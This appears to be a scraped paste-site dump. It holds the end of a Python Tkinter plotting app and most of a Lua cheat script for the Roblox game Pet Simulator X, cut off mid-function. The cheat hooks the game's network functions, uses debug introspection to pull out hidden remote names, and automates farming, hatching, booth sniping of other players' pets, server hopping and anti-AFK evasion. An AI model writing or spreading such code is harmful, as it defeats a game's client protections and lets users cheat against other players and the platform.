resistance_slider = tk.Scale(params_frame, from_=0, to=10, resolution=0.1, orient=tk.HORIZONTAL,
                             variable=resistance_var, command=update_plot)
resistance_slider.set(1.0)
resistance_slider.grid(row=0, column=2, padx=5, pady=5)

inductance_label = ttk.Label(params_frame, text='Inductance (L):')
inductance_label.grid(row=1, column=0, padx=5, pady=5, sticky='E')
inductance_entry = ttk.Entry(params_frame, width=10, textvariable=inductance_var)
inductance_entry.insert(tk.END, '2.0')
inductance_entry.grid(row=1, column=1, padx=5, pady=5)
inductance_entry.bind('<Return>', update_plot)

inductance_slider = tk.Scale(params_frame, from_=0, to=10, resolution=0.1, orient=tk.HORIZONTAL,
                             variable=inductance_var, command=update_plot)
inductance_slider.set(2.0)
inductance_slider.grid(row=1, column=2, padx=5, pady=5)

leakage_label = ttk.Label(params_frame, text='Leakage (G):')
leakage_label.grid(row=2, column=0, padx=5, pady=5, sticky='E')
leakage_entry = ttk.Entry(params_frame, width=10, textvariable=leakage_var)
leakage_entry.insert(tk.END, '0.5')
leakage_entry.grid(row=2, column=1, padx=5, pady=5)
leakage_entry.bind('<Return>', update_plot)

leakage_slider = tk.Scale(params_frame, from_=0, to=1, resolution=0.01, orient=tk.HORIZONTAL,
                          variable=leakage_var, command=update_plot)
leakage_slider.set(0.5)
leakage_slider.grid(row=2, column=2, padx=5, pady=5)

capacitance_label = ttk.Label(params_frame, text='Capacitance (C):')
capacitance_label.grid(row=3, column=0, padx=5, pady=5, sticky='E')
capacitance_entry = ttk.Entry(params_frame, width=10, textvariable=capacitance_var)
capacitance_entry.insert(tk.END, '0.8')
capacitance_entry.grid(row=3, column=1, padx=5, pady=5)
capacitance_entry.bind('<Return>', update_plot)

capacitance_slider = tk.Scale(params_frame, from_=0, to=1, resolution=0.01, orient=tk.HORIZONTAL,
                              variable=capacitance_var, command=update_plot)
capacitance_slider.set(0.8)
capacitance_slider.grid(row=3, column=2, padx=5, pady=5)

# Создание кнопки обновления
update_button = ttk.Button(root, text='Update', command=update_plot)
update_button.pack(pady=10)

# Создание фигуры и подключение ее к Tkinter
fig = plt.figure(figsize=(12, 6))
ax_u = fig.add_subplot(121, projection='3d')
ax_i = fig.add_subplot(122, projection='3d')

canvas = FigureCanvasTkAgg(fig, master=root)
canvas.draw()
canvas.get_tk_widget().pack(side=tk.TOP, fill=tk.BOTH, expand=True)

# Запуск приложения
update_plot()
root.mainloop()"
c44bcyaP,source,NukeVsCity,Lua,Tuesday 27th of June 2023 08:13:54 AM CDT,"







--this doesnt work yet dont execute










if not LPH_OBFUSCATED then
    LPH_JIT_MAX = function(...) return(...) end;
    LPH_NO_VIRTUALIZE = function(...) return(...) end;
end

--//Pet Simulator X
repeat task.wait() until game:IsLoaded()
if game.PlaceId == 6284583030 or 10321372166 or 7722306047 then
repeat task.wait() until require(game.ReplicatedStorage:WaitForChild(""Framework""):WaitForChild(""Library"")).Loaded

local StartTick = tick()

--// Anti Afk
local VirtualUser=game:service'VirtualUser'
game:service'Players'.LocalPlayer.Idled:connect(function()
VirtualUser:CaptureController()
VirtualUser:ClickButton2(Vector2.new())
end)

--// Variables
local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local Players = game:GetService(""Players"")
local Workspace = game:GetService(""Workspace"")
local HttpService = game:GetService(""HttpService"")
local TeleportService = game:GetService(""TeleportService"")
local RunService = game:GetService(""RunService"")
local PathfindingService = game:GetService(""PathfindingService"")
local ReplicatedFirst = game:GetService(""ReplicatedFirst"")
local Player = Players.LocalPlayer

if not isfolder(""MilkUp"") then
    makefolder(""MilkUp"")
end
if not isfolder(""MilkUp/PetSimulatorX"") then
    makefolder(""MilkUp/PetSimulatorX"")
end
if not isfile(""MilkUp/PetSimulatorX/GlobalSettings.json"") then
    writefile(""MilkUp/PetSimulatorX/GlobalSettings.json"", HttpService:JSONEncode({[""LoadConfig""] = false, [""SeparateConfig""] = false}))
end

local Library = require(ReplicatedStorage:WaitForChild(""Framework""):WaitForChild(""Library""))
local Scripts = Player.PlayerScripts.Scripts
local Api = ""https://games.roblox.com/v1/games/""
local HTTPRequest =  http_request or request or HttpPost or syn.request
local UserIDToUsername = Library.Functions.UserIdToUsername
local IsHardcoreMode = (game.PlaceId == 10321372166 and true) or false
local Premium = (LRM_IsUserPremium and true) or (not LPH_OBFUSCATED and true) or false
local DiscordID = (not LPH_OBFUSCATED and ""Flury"") or (LRM_LinkedDiscordID and LRM_LinkedDiscordID)  or ""Someone""
local RemotesLoaded = false
local ScriptVersion = 2.4

--// PSX Remotes
local Remotes = {
    [""Get Coins""] = {""Invoke"", nil},
    [""Join Coin""] = {""Invoke"", nil},
    [""Leave Coin""] = {""Invoke"", nil},
    [""Farm Coin""] = {""Fire"", nil},
    [""Claim Orbs""] = {""Invoke"", nil},
    [""Collect Lootbag""] = {""Fire"", nil},
    [""Buy Egg""] = {""Invoke"", nil},
    [""Use Golden Machine""] = {""Invoke"", nil},
    [""Use Rainbow Machine""] = {""Invoke"", nil},
    [""Convert To Dark Matter""] = {""Invoke"", nil},
    [""Redeem Dark Matter Pet""] = {""Invoke"", nil},
    [""Fuse Pets""] = {""Invoke"", nil},
    [""Delete Several Pets""] = {""Invoke"", nil},
    [""Request World""] = {""Invoke"", nil},
    [""Claim Trading Booth""] = {""Invoke"", nil},
    [""Purchase Trading Booth Pet""] = {""Invoke"", nil},
    [""Add Trading Booth Pet""] = {""Invoke"", nil},
    [""Get Booth By Id""] = {""Invoke"", nil},
    [""Get All Booths""] = {""Invoke"", nil},
    [""Redeem Rank Rewards""] = {""Invoke"", nil},
    [""Redeem VIP Rewards""] = {""Invoke"", nil},
    [""Redeem Free Gift""] = {""Invoke"", nil},
    [""Activate Boost""] = {""Fire"", nil},
    [""Activate Server Boost""] = {""Fire"", nil},
    [""Travel To Main World""] = {""Invoke"", nil},
    [""Travel To Trading Plaza""] = {""Invoke"", nil},
    [""Travel To Hardcore World""] = {""Invoke"", nil},
    [""Buy Area""] = {""Invoke"", nil},
    [""Request Cannon Launch""] = {""Invoke"", nil},
    [""Start Hacker Portal Quests""] = {""Fire"", nil},
    [""Finish Hacker Portal Quest""] = {""Invoke"", nil}
}

local function UseRemote(RemoteName, ...)
    if RemoteName[2] ~= nil and RemotesLoaded then
        local RemoteNetwork = Library.Network[RemoteName[1]]
        return RemoteNetwork(RemoteName[2], ...)
    end
end

local function AdvancedSignal(Content, ColorToInput)
    return Library.Signal.Fire(""Notification"", Content, {color = ColorToInput})
end

local function NewFunction(...)
    return ...
end

local function GetAllRemotes()
    task.spawn(function()
        task.wait(10)
        LPH_NO_VIRTUALIZE(function()
            local RemoteTime = tick()
            InvokeHook = hookfunction(getupvalue(Library.Network.Invoke, 1), function(...) return true end)
            FireHook = hookfunction(getupvalue(Library.Network.Fire, 1), function(...) return true end)
            for i,v in pairs(getgc()) do
                if type(v) == ""function"" and islclosure(v) then
                    --// Join Coin
                    if debug.getinfo(v).name == ""SelectCoin"" then
                        if #debug.getconstants(v) > 15 then
                            Remotes[""Join Coin""][2] = debug.getconstant(v, 36)
                            Remotes[""Leave Coin""][2] = debug.getconstant(v, 51)
                        end
                    end 
                    --// Farm Coin
                    if debug.getinfo(v).name == ""SelectCoin"" then
                        if #debug.getconstants(v) > 15 then
                            Remotes[""Farm Coin""][2] = debug.getconstant(debug.getproto(v, 5), 6)
                        end
                    end
                end
            end
            
            --// Get Coins
            Remotes[""Get Coins""][2] = debug.getconstant(getsenv(Scripts.Game.Coins).InvokeCoins, 3)

            --// Collect LootBag
            Remotes[""Collect Lootbag""][2] = debug.getconstant(getsenv(Scripts.Game.Lootbags).Collect, 32)

            --// Buy Egg
            Remotes[""Buy Egg""][2] = debug.getconstant(debug.getproto(getsenv(Scripts.Game.Eggs).SetupEgg, 5), 26)

            --/ Use Golden Machine
            Remotes[""Use Golden Machine""][2] = debug.getconstant(getsenv(Scripts.GUIs[""Golden Machine""]).Convert, 15)

            --// Use Rainbow Machine
            Remotes[""Use Rainbow Machine""][2] = debug.getconstant(getsenv(Scripts.GUIs[""Rainbow Machine""]).Convert, 15)

            --// Convert To Dark Matter
            Remotes[""Convert To Dark Matter""][2] = debug.getconstant(getsenv(Scripts.GUIs[""Dark Matter Machine""]).PetsConvert, 3)

            --// Redeem Dark Matter Pet
            Remotes[""Redeem Dark Matter Pet""][2] = debug.getconstant(getsenv(Scripts.GUIs[""Dark Matter Machine""]).RedeemQueuePet, 3)

            --// Fuse Pets
            Remotes[""Fuse Pets""][2] = debug.getconstant(getsenv(Scripts.GUIs[""Fuse Pets""]).Fuse, 7)

            --// Delete Several Pets
            Remotes[""Delete Several Pets""][2] = debug.getconstant(debug.getproto(getsenv(Scripts.GUIs.Inventory).DeletePets, 1), 22)

            --// Request World
            Remotes[""Request World""][2] = debug.getconstant(Library.WorldCmds.Load, 16)

            --// Claim Trading Booth
            Remotes[""Claim Trading Booth""][2] = debug.getconstant(getsenv(Scripts.Game[""Trading Booths""]).ClaimBooth, 3)

            --// Purchase Trading Booth Pet
            Remotes[""Purchase Trading Booth Pet""][2] = debug.getconstant(getsenv(Scripts.Game[""Trading Booths""]).AttemptBuy, 32)

            --// Add Trading Booth Pet
            Remotes[""Add Trading Booth Pet""][2] = debug.getconstant(getsenv(Scripts.GUIs[""List Pet""]).List, 8)

            --// Get Booth By Id
            Remotes[""Get Booth By Id""][2] = debug.getconstant(getsenv(Scripts.GUIs[""Booth Inventory""]).Update, 7)

            --// Get All Booths
            Remotes[""Get All Booths""][2] = debug.getconstant(getsenv(Scripts.Game[""Trading Booths""]).Setup, 3)

            --// Redeem Rank Rewards
            Remotes[""Redeem Rank Rewards""][2] = debug.getconstant(getsenv(Scripts.Game[""Reedem Rank Rewards""]).Redeem, 3)

            --// Redeem VIP Rewards
            Remotes[""Redeem VIP Rewards""][2] = debug.getconstant(getsenv(Scripts.Game[""Reedem VIP Rewards""]).Redeem, 3)

            --// Redeem Free Gift
            Remotes[""Redeem Free Gift""][2] = debug.getconstant(getsenv(Scripts.GUIs[""Free Gifts""]).Redeem, 3)

            --// Activate Boost
            Remotes[""Activate Boost""][2] = debug.getconstant(debug.getproto(debug.getproto(getsenv(Scripts.GUIs[""Exclusive Shop""]).UpdateBoosts, 2), 2), 3)

            --// Activate Server Boost
            Remotes[""Activate Server Boost""][2] = debug.getconstant(debug.getproto(debug.getproto(getsenv(Scripts.GUIs[""Server Boosts""]).Update, 3), 1), 3)

            --// World Remotes
            Remotes[""Travel To Main World""][2] = debug.getconstant(getsenv(Scripts.Game.Misc[""Leave Trading Plaza""]).Request, 5)
            Remotes[""Travel To Hardcore World""][2] = debug.getconstant(getsenv(Scripts.Game.Misc[""Hardcore Mode Teleports""]).Request, 15)
            Remotes[""Travel To Trading Plaza""][2] = debug.getconstant(getsenv(Scripts.Game.Misc[""Join Trading Plaza""]).Request, 7)

            --// Buy Gate
            Remotes[""Buy Area""][2] = debug.getconstant(getsenv(Scripts.Game.Gates).BuyGate, 20)

            --// Request Cannon Launch
            Remotes[""Request Cannon Launch""][2] = debug.getconstant(getsenv(Scripts.Game.Cannons).ClientAttemptFire, 14)

            --// Start Hacker Portal Quest
            Remotes[""Start Hacker Portal Quests""][2] = debug.getconstant(getsenv(Scripts.Game[""Hacker Portal Quests""]).PromptQuest, 12)

            --// Finish Hacker Portal Quest
            Remotes[""Finish Hacker Portal Quest""][2] = debug.getconstant(getsenv(Scripts.Game[""Hacker Portal Quests""]).PromptQuest, 19)
            RemotesLoaded = true
             AdvancedSignal(""Remotes Loaded Took: ""..tick() - RemoteTime, Color3.fromRGB(115, 80, 255))
        end)()
    end)
end

GetAllRemotes()

LPH_NO_VIRTUALIZE(function()
    local Audio = require(game:GetService(""ReplicatedStorage"").Library.Audio)
    local AudoHook
    local FakeSound = Instance.new(""Sound"", game.Workspace)
    FakeSound.Name = ""Fake""
    AudoHook = hookfunction(Audio.Play, function(...)
        return FakeSound
    end)
end)()

--// Tables
getgenv().Config = {
    ConfigVersion = ScriptVersion,
    SelectedConfig = ""None"",
    Valentines = {
        StartHeartFarm = false,
        StartWorldTeleport = false,
        StartServerTeleport = false,
        StartInstantWorldTeleport = false,
        Worlds = {
            Spawn = false,
            Fantasy = false,
            Tech = false,
            Axolotl = false,
            Pixel = false,
            Cat = false
        }
    },
    Farming = {
        StartFarm = false,
        Mode = ""Normal"",
        CoinType = ""Normal"",
        FarmSpeed = 0.09,
        PetSendSpeed = 0,
        SendAllPets = false,
        CollectOrbs = false,
        CollectLootbags = false,
        TeleportToCoinsArea = false,
        StayOnPrivatePlatform = false,
        StartCompleteGame = false,
        Areas = {},
        Blacklisted = {}
    },
    Pets = {
        StartHatch = false,
        StartOpenInventory = false,
        DisableEggAnimation = false,
        DisableNotifications = false,
        TeleportToEgg = false,
        Mode = ""Single"",
        ChoosenEgg = ""None""
    },
    Machines = {
        Golden = {
            StartGolden = false,
            GoldenAmount = 6,
            GoldenHC = false,
            GoldenHCAmount = 10,
            GoldenShiny = false,
        },
        Rainbow = {
            StartRainbow = false,
            RainbowAmount = 6,
            RainbowHC = false,
            RainbowHCAmount = 10,
            RainbowShiny = false,
        },
        DarkMatter = {
            StartDarkMatter = false,
            ClaimPets = false,
            DarkMatterAmount = 6,
            DarkMatterHC = false,
            DarkMatterHCAmount = 8,
            DarkMatterShiny = false,
        },
        Fusing = {
            StartFuse = false,
            Amount = 3,
            Mode = ""Normal"",
            WhenToStop = 0
        }
    },
    Booths = {
        Selling = {
            StartSellingPet = false,
            ChoosenPetToSell = ""None"",
            ChoosenPetPrice = ""None"",
            SellingList = {},
            Options = {},
            EditMode = false,
            EditNumber = ""None""
        },
        Sniping = {
            StartSnipingPet = false,
            SnipePetRarity = false,
            SnipePetUnder = false,
            GemsUnderToSnipe = ""None"",
            ChoosenPetToSnipe = ""None"",
            SnipingList = {},
            Options = {},
            Rarities = {},
            EditMode = false,
            EditNumber = ""None""
        },
        Extra = {
            TeleportToBooth = false,
            GoInvisible = false,
            WalkToBooth = false,
            BoothServerHop = false,
            BoothServerHopVoice = false,
            BoothServerHopSeconds = 1
        }
    },
    Deleting = {
        StartDelete = false,
        DeleteByRarity = false,
        ChoosenPetToDelete = ""None"",
        Options = {},
        Rarities = {}
    },
    Misc = {
        Redeeming = {
            RedeemRankRewards = false,
            RedeemVIPRewards = false,
            RedeemFreeGifts = false
        },
        Teleports = {
            LoadNormalExperience = false,
            LoadHardcoreExperience = false,
            LoadTradingExperience = false,
            LoadTradingVoiceExperience = false,
        },
        Hoverboards = {
            CurrentHoverboard = ""Cat"",
            HoverboardSpeed = 75,
        },
        Boosting = {
            UseBoosts = false,
            UseAllBoosts = false,
            BoostsToActivate = {},
            UseServerBoost = false,
            ServerBoostsToActivate = {}
        },
        Extra = {
            StatsTracker = false,
            ReduceLag = false,
            LockFps = false,
            ChangeFpsTo = 60
        }
    },
    PetCollection = {
        StartCollecting = false,
        Mode = ""Single"",
        Options = {},
        Rarities = {}
    },
    Mastery = {
        StartCompletingMasterys = false,
        MasterysToFarm = {},
    },
    Guis = {
        GuiMachines = {
            GoldenMachine = ""T"",
            RainbowMachine = ""Y"",
            DarkMatterMachine = ""G"",
            FuseMachine = ""J"",
            EnchantMachine = ""H"",
            BankMachine = ""B"",
            ServerBoostMachine = ""V""
        }
    },
    Webhooks = {
        HatchWebhook = {
            StartWebhook = false,
            ChoosenWebhook = ""None"",
            PingUser = false,
            ChoosenUserID = ""None"",
            ShowChances = false,
            ShowEggsHatched = false,
            ShowEggsRemaining = false,
            ShowCurrencyRemaining = false,
            ShowStrength = false,
            ShowEnchants = false,
            Rarities = {}
        },
        SnipeWebhook = {
            StartWebhook = false,
            ChoosenWebhook = ""None"",
            PingUser = false,
            ChoosenUserID = ""None"",
            ShowGemsSnipedFor = false,
            ShowGemsRemaining = false,
            ShowOwner = false,
            ShowStrength = false,
            ShowEnchants = false
        },
        SellWebhook = {
            StartWebhook = false,
            ChoosenWebhook = ""None"",
            PingUser = false,
            ChoosenUserID = ""None"",
            ShowSoldFor = false,
            ShowTotalGems = false,
            ShowPurchasedBy = false,
        }
    }
}

local IsLoadConfig = (HttpService:JSONDecode(readfile(""MilkUp/PetSimulatorX/GlobalSettings.json""))[""LoadConfig""] == true and true) or false
local IsSeparateConfig = (HttpService:JSONDecode(readfile(""MilkUp/PetSimulatorX/GlobalSettings.json""))[""SeparateConfig""] == true and true) or false
if not isfile(""MilkUp/PetSimulatorX/DefaultConfig.json"") then
    writefile(""MilkUp/PetSimulatorX/DefaultConfig.json"", HttpService:JSONEncode(Config))
end
if IsSeparateConfig and not isfile(""MilkUp/PetSimulatorX/""..Player.Name.."".json"") then
    writefile(""MilkUp/PetSimulatorX/""..Player.Name.."".json"", HttpService:JSONEncode(Config))
end
local ConfigName = (IsSeparateConfig and ""MilkUp/PetSimulatorX/""..Player.Name.."".json"") or ""MilkUp/PetSimulatorX/DefaultConfig.json""

--// Config
local function DeleteConfig()
    if isfile(ConfigName) then
        delfile(ConfigName)
        AdvancedSignal(""Deleted Config!"", Color3.fromRGB(255, 0, 0))
    end
end

local function SaveConfig()
    writefile(ConfigName, HttpService:JSONEncode(Config))
end

local function UpdateConfg()
    for i,v in pairs(HttpService:JSONDecode(readfile(ConfigName))) do
        if type(v) == ""table"" then
            for i2,v2 in pairs(v) do
                if type(v2) == ""boolean"" then
                    Config[i][i2] = v2
                end
                if type(v2) == ""string"" then
                    Config[i][i2] = v2
                end
                if type(v2) == ""table"" then
                    for i3,v3 in pairs(v2) do
                        if type(v3) ~= ""table"" then
                            Config[i][i2] = v2
                        end
                        if type(v3) == ""boolean"" then
                            Config[i][i2][i3] = v3
                        end
                        if type(v2) == ""string"" then
                            Config[i][i2][i3] = v3
                        end
                        if type(v3) == ""table"" then
                            Config[i][i2][i3] = v3
                        end
                    end
                end
            end
        end
    end
    writefile(ConfigName, HttpService:JSONEncode(Config))
    AdvancedSignal(""Updated Config To Latest Version!"", Color3.fromRGB(52, 235, 171))
    -- AdvancedSignal(""Config Error! Erased Config, Sorry!"", Color3.fromRGB(224, 67, 67))
end

local function LoadConfig()
    if isfile(ConfigName) and IsLoadConfig then
        if HttpService:JSONDecode(readfile(ConfigName))[""ConfigVersion""] ~= ScriptVersion then
            UpdateConfg()
        else
            Config = HttpService:JSONDecode(readfile(ConfigName))
        end
        ConfigLoaded = true
        return AdvancedSignal(""Loaded Config!"", Color3.fromRGB(88, 247, 255))
    end
end

local ConfigSuccess, ConfigError = pcall(function() LoadConfig() end)
if not ConfigSuccess then
    warn(""(Error-MilkUp) ""..ConfigError)
    AdvancedSignal(""Config Error! Please Make A Ticket At .gg/milkup"", Color3.fromRGB(224, 67, 67))
end

--// Tables
local RaritiesList = {""Basic"", ""Rare"", ""Epic"", ""Legendary"", ""Mythical"", """", ""Event"",  ""Exclusive""}
local RaritiesWithoutExclusiveList = {""Basic"", ""Rare"", ""Epic"", ""Legendary"", ""Mythical""}
local TypeList = {""Regular"", ""Hardcore"", ""Shiny"", ""Golden"", ""Rainbow"", ""Dark Matter"", ""Any""}
local TypesForCollectionList = {""Regular"", ""Golden"", ""Rainbow"", ""Dark Matter"", ""Any""}
local MasteryList = {""Coin Piles"", ""Crates"", ""Diamond Piles"", ""Chests"", ""Presents"", ""VaultsAndSafes"", ""Eggs"", ""Golden Eggs""}

local LayoutOrdersList = {
    [""Diamonds""] = 999910,
    [""Halloween Candy""] = 999920,
    [""Gingerbread""] = 999930,
    [""Rainbow Coins""] = 999940,
    [""Tech Coins""] = 999950,
    [""Fantasy Coins""] = 999960,
    [""Coins""] = 999970,
}

local AreaList = {}
for i,v in pairs(ReplicatedStorage[""__DIRECTORY""].Areas:GetChildren()) do
    if not AreaList[v.Name:split(""| "")[2]] then
        AreaList[v.Name:split(""| "")[2]] = {}
    end
    for i2,v2 in pairs(require(v)) do
        table.insert(AreaList[v.Name:split(""| "")[2]], i2)
    end
end

local HoverboardList = {}
for i,v in pairs(Library.Directory.Hoverboards) do
    table.insert(HoverboardList, i)
end

local CoinTypeList = {}
for i,v in pairs(Library.Directory.Worlds) do
    if v.Disabled ~= true then
        if not CoinTypeList[i] then
            CoinTypeList[i] = {}
        end
        for i2,v2 in pairs(v.spawns) do
            for i3,v3 in pairs(v2.coins) do
                table.insert(CoinTypeList[i], v3[1])
            end
        end
    end
end

local EggList = {}
for i,v in pairs(ReplicatedStorage[""__DIRECTORY""].Eggs:GetDescendants()) do
    if v:IsA(""ModuleScript"") and v.Name ~= ""Grab All Eggs"" then
        local EggModule = require(v)
        if EggModule.hatchable then
            table.insert(EggList, v.Name)
        end
    end
end
table.sort(EggList, function(a,b)
    return a < b
end)

local PetList = {}
for i,v in pairs(ReplicatedStorage[""__DIRECTORY""].Pets:GetChildren()) do
    if not v:IsA(""ModuleScript"") then
        for i2,v2 in pairs(v:GetChildren()) do
            if v2:IsA(""ModuleScript"") then
                if not PetList[require(v2).rarity] then
                    PetList[require(v2).rarity] = {}
                end
                table.insert(PetList[require(v2).rarity], v.Name)
            end
        end
    end
end
for i,v in pairs(PetList) do
    table.sort(v, function(a,b)
        return a:split(""- "")[2] < b:split(""- "")[2]
    end)
end

local CompleteTable = {
	""Town"",--// World
	""Forest"",
	""Beach"",
	""Mine"",
	""Winter"",
	""Glacier"",
	""Desert"",
	""Volcano"",
    'Cave',
	""Enchanted Forest"",--// World
	""Ancient Island"",
	""Samurai Island"",
	""Candy Island"",
	""Haunted Island"",
	""Hell Island"",
	""Heaven Island"",
	""Heavens Gate"",
	""Ice Tech"",
	""Tech City"", --//World
	""Dark Tech"",
	""Steampunk"",
	""Alien Lab"",
	""Alien Forest"",
	""Glitch"",
	""Hacker Portal"",
	""The Void"",--// World
	""Axolotl Ocean"",--// World
	""Axolotl Deep Ocean"",
	""Axolotl Cave"",
	""Pixel Forest"", --// World
	""Pixel Kyoto"",
	""Pixel Alps"",
	""Pixel Vault"",
	""Cat Paradise"",--// World
	""Cat Backyard"",
	""Cat Taiga"",
	""Cat Kingdom""
}

local BlacklistedDiscords = {""1026701036678807643""}
--// Functions
--// Misc Functions
local function LowServerTeleport(GameHop, GameID)
    local LowPlayerServerId
    if GameHop then
        LowPlayerServerId = GameID
    else
        LowPlayerServerId = game.PlaceId
    end
    local PlaceID = LowPlayerServerId
    local AllIDs = {}
    local foundAnything = """"
    local actualHour = os.date(""!*t"").hour
    local Deleted = false
    local File = pcall(function()
        AllIDs = game:GetService('HttpService'):JSONDecode(readfile(""NotSameServers.json""))
    end)
    if not File then
        table.insert(AllIDs, actualHour)
        writefile(""NotSameServers.json"", game:GetService('HttpService'):JSONEncode(AllIDs))
    end
    function TPReturner()
        local Site;
        if foundAnything == """" then
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100'))
        else
            Site = game.HttpService:JSONDecode(game:HttpGet('https://games.roblox.com/v1/games/' .. PlaceID .. '/servers/Public?sortOrder=Asc&limit=100&cursor=' .. foundAnything))
        end
        local ID = """"
        if Site.nextPageCursor and Site.nextPageCursor ~= ""null"" and Site.nextPageCursor ~= nil then
            foundAnything = Site.nextPageCursor
        end
        local num = 0;
        for i,v in pairs(Site.data) do
            local Possible = true
            ID = tostring(v.id)
            if tonumber(v.maxPlayers) > tonumber(v.playing) then
                for _,Existing in pairs(AllIDs) do
                    if num ~= 0 then
                        if ID == tostring(Existing) then
                            Possible = false
                        end
                    else
                        if tonumber(actualHour) ~= tonumber(Existing) then
                            local delFile = pcall(function()
                                delfile(""NotSameServers.json"")
                                AllIDs = {}
                                table.insert(AllIDs, actualHour)
                            end)
                        end
                    end
                    num = num + 1
                end
                if Possible == true then
                    table.insert(AllIDs, ID)
                    wait()
                    pcall(function()
                        writefile(""NotSameServers.json"", game:GetService('HttpService'):JSONEncode(AllIDs))
                        wait()
                        game:GetService(""TeleportService""):TeleportToPlaceInstance(PlaceID, ID, game.Players.LocalPlayer)
                    end)
                    wait(4)
                end
            end
        end
    end
    
    function Teleport()
        while wait() do
            pcall(function()
                TPReturner()
                if foundAnything ~= """" then
                    TPReturner()
                end
            end)
        end
    end
    Teleport()
end

function ServerTeleport(Place)
    local function FindServer(PlaceID)
        local servers = {}
        local req = HTTPRequest({Url = ""https://games.roblox.com/v1/games/"".. PlaceID..""/servers/Public?sortOrder=Desc&limit=100""})
        local body = HttpService:JSONDecode(req.Body)
        if body and body.data then
            for i, v in next, body.data do
                if type(v) == ""table"" and tonumber(v.playing) and tonumber(v.maxPlayers) and v.playing < v.maxPlayers and (PlaceID == 7722306047 and v.playing > 20) or (PlaceID == 11725212117 and v.playing > 20) or v.playing > 7 and v.id ~= game.JobId then
                    table.insert(servers, {v.playing, v.id})
                end
            end
        end
        game:GetService(""TeleportService""):TeleportToPlaceInstance(PlaceID, servers[math.random(1, #servers)][2], Players.LocalPlayer)
    end
    if Place == ""Main World"" then
        while task.wait(1) do FindServer(6284583030) end
    elseif Place == ""Hardcore World"" then
        while task.wait(1) do FindServer(10321372166) end
    elseif Place == ""Trading Plaza"" then
        while task.wait(1) do FindServer(7722306047) end
    elseif Place == ""Trading Plaza Voice Chat"" then
        while task.wait(1) do FindServer(11725212117) end
    end
end

local function GetHumanoidRootPart()
    return Player.Character.HumanoidRootPart
end

local function FindPath(Destination)
    local Humanoid = Player.Character.Humanoid
    local CreatedPath = PathfindingService:CreatePath()
    CreatedPath:ComputeAsync(GetHumanoidRootPart().Position, Destination.Position)
    if CreatedPath.Status == Enum.PathStatus.Success then
        for i,v in pairs(CreatedPath:GetWaypoints()) do
            Humanoid:MoveTo(v.Position + Vector3.new(0,0,5))
            local MoveSuccess = Humanoid.MoveToFinished:Wait()
            if v.Action == Enum.PathWaypointAction.Jump then
                Humanoid.WalkSpeed = 0
                task.wait(0.2)
                Humanoid.WalkSpeed = 16
                Humanoid.Jump = true
            end
            if not MoveSuccess then
                Humanoid.Jump = true
                Humanoid:MoveTo(v.Position)
                if not Humanoid.MoveToFinished:Wait() then
                    break
                end
            end
        end
        return
    end
end

local function CalculateItemsInTable(Table, AmountOfLoops)
    local AmountToReturn = 0
    if AmountOfLoops == 1 then
        for i,v in pairs(Table) do
            AmountToReturn = AmountToReturn + 1
        end
    elseif AmountOfLoops == 2 then
        for i,v in pairs(Table) do
            for i2,v2 in pairs(v) do
                AmountToReturn = AmountToReturn + 1
            end
        end
    end
    return AmountToReturn
end

local function DateTime()
    local OSTime = os.time()
    local Time = os.date('!*t', OSTime)
    return string.format('%d-%d-%dT%02d:%02d:%02dZ', Time.year, Time.month, Time.day, Time.hour, Time.min, Time.sec)
end

local function CheckTypeOrRarity(Type, TypeTable, CheckTable)
    local Settings = TypeTable
    local Pet = CheckTable
    if Type == ""Type"" then
        if (Settings[""Regular""] and (not Pet.hc and not Pet.sh and not Pet.g and not Pet.r and not Pet.dm)) then
            return true
        end
        if (Settings[""Golden""] and (not Pet.hc and not Pet.sh and Pet.g)) then
            return true
        end
        if (Settings[""Rainbow""] and (not Pet.hc and not Pet.sh and Pet.r)) then
            return true
        end
        if (Settings[""Dark Matter""] and (not Pet.hc and not Pet.sh and Pet.dm)) then
            return true
        end
        if ((Settings[""Hardcore""] and Settings[""Regular""]) and (Pet.hc and not Pet.sh and not Pet.g and not Pet.r and not Pet.dm)) then
            return true
        end
        if ((Settings[""Hardcore""] and Settings[""Golden""]) and (Pet.hc and not Pet.sh and Pet.g)) then
            return true
        end
        if ((Settings[""Hardcore""] and Settings[""Rainbow""]) and (Pet.hc and not Pet.sh and Pet.r)) then
            return true
        end
        if ((Settings[""Hardcore""] and Settings[""Dark Matter""]) and (Pet.hc and not Pet.sh and Pet.dm)) then
            return true
        end
        if ((Settings[""Shiny""] and Settings[""Regular""]) and (not Pet.hc and Pet.sh and not Pet.g and not Pet.r and not Pet.dm)) then
            return true
        end
        if ((Settings[""Shiny""] and Settings[""Golden""]) and (not Pet.hc and Pet.sh and Pet.g)) then
            return true
        end
        if ((Settings[""Shiny""] and Settings[""Rainbow""]) and (not Pet.hc and Pet.sh and Pet.r)) then
            return true
        end
        if ((Settings[""Shiny""] and Settings[""Dark Matter""]) and (not Pet.hc and Pet.sh and Pet.dm)) then
            return true
        end
        if ((Settings[""Shiny""] and Settings[""Hardcore""] and Settings[""Regular""]) and (Pet.hc and Pet.sh and not Pet.g and not Pet.r and not Pet.dm)) then
            return true
        end
        if ((Settings[""Shiny""] and Settings[""Hardcore""] and Settings[""Golden""]) and (Pet.hc and Pet.sh and Pet.g)) then
            return true
        end
        if ((Settings[""Shiny""] and Settings[""Hardcore""] and Settings[""Rainbow""]) and (Pet.hc and Pet.sh and Pet.r)) then
            return true
        end
        if ((Settings[""Shiny""] and Settings[""Hardcore""] and Settings[""Dark Matter""]) and (Pet.hc and Pet.sh and Pet.dm)) then
            return true
        end
        if Settings[""Any""] then
            return true
        end
    elseif Type == ""Rarity"" then
